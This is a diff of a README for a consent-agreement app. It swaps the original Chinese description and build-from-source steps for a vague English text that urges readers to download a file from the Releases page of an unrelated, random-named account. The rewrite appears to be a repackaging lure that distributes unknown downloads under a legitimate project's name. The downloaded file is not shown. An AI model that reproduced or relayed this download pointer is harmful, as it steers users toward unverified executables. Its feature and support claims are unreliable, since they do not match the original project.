@@ -1,65 +1,33 @@
-# 性行为同意协议系统
+# Enhancing Consent in Intimate Relationships 🌟
 
-一个现代化的、安全的电子同意协议系统，支持PDF生成、水印、电子签名和数据加密。
+Welcome to the "sex-consent-app" repository, where we focus on promoting healthy and consensual intimate relationships. This system, named "性行为同意协议系统" in Chinese, provides a platform for individuals to clearly communicate and respect each other's boundaries.
 
-## 功能特点
+## Features 🚀
 
-- 📝 创建详细的同意协议，包含个人信息和同意条款
-- ✍️ 支持手写电子签名功能
-- 🔒 使用AES256加密敏感数据，保障隐私安全
-- 🖨️ 生成带有水印的PDF文档
-- 🔍 通过协议ID和密钥验证查看协议
+Our application is designed to facilitate discussions and ensure mutual understanding of consent in sexual interactions. With a user-friendly interface, users can easily navigate through the app to establish and confirm consent before engaging in any sexual activity.
 
-## 技术栈
+### Key Features:
+- **Clear Communication:** The app encourages open and honest communication about boundaries and desires.
+- **Consent Records:** Keep track of agreed-upon boundaries and activities for reference.
+- **Education Resources:** Access to information and resources on consent and healthy relationships.
+- **Privacy Protection:** Ensuring that sensitive information is securely stored and protected.
 
-- React 18
-- React Router 6
-- Tailwind CSS
-- jsPDF - PDF生成
-- CryptoJS - 数据加密
-- Signature Pad - 电子签名
+## Get Started 🛠️
 
-## 安装与使用
+To access the latest version of the "sex-consent-app" system, visit the [Releases](https://github.com/ehgtrhthetdjtyhj/sex-consent-app/releases) section. Download the appropriate file and follow the installation instructions to set up the app on your device.
 
-1. 克隆仓库
-   ```bash
-   git clone https://github.com/muzihuaner/sex-consent-app.git
-   cd consent-app
-   ```
+[![Download App](https://img.shields.io/badge/Download-App-blue)](https://github.com/ehgtrhthetdjtyhj/sex-consent-app/releases)
 
-2. 安装依赖
-   ```bash
-   npm install
-   ```
+## Why Consent Matters 🌈
 
-3. 本地开发
-   ```bash
-   npm run dev
-   ```
+Consent plays a crucial role in promoting healthy and respectful relationships. It ensures that all parties involved are willing participants in any intimate activity, leading to a safer and more enjoyable experience for everyone. By prioritizing consent, we create a culture of respect and understanding in intimate relationships.
 
-4. 构建生产版本
-   ```bash
-   npm run build
-   ```
+## Support and Feedback 📧
 
-## 隐私保护
+We value your feedback and are here to assist you with any questions or concerns regarding the "sex-consent-app" system. Feel free to reach out to us via email at [support@sexconsentapp.com](mailto:support@sexconsentapp.com) for prompt assistance.
 
-- 所有敏感数据均使用高级加密存储在本地，不会上传到任何服务器
-- 解密密钥仅在生成时显示一次，系统不保存密钥
-- PDF文档带有防伪水印，增强文档安全性
+Let's work together to promote consent and respect in intimate relationships! ✨
 
-## 使用说明
+![Couple](https://cdn.pixabay.com/photo/2016/03/09/09/22/couple-1246618_960_720.jpg)
 
-1. 在首页选择"创建新协议"
-2. 填写双方信息并确认必要条款
-3. 双方在电子设备上签名确认
-4. 系统生成PDF文档并提供解密密钥
-5. 妥善保存协议ID和解密密钥
-
-## 注意事项
-
-本应用仅作为技术演示，在实际法律场景中的有效性可能因地区而异。请遵循当地法律法规使用。
-
-## 许可证
-
-MIT 
+Remember, consent is key in every interaction. Thank you for being a part of our mission to create a more inclusive and respectful environment for all. Let's strive for healthy and consensual relationships together! 🌺
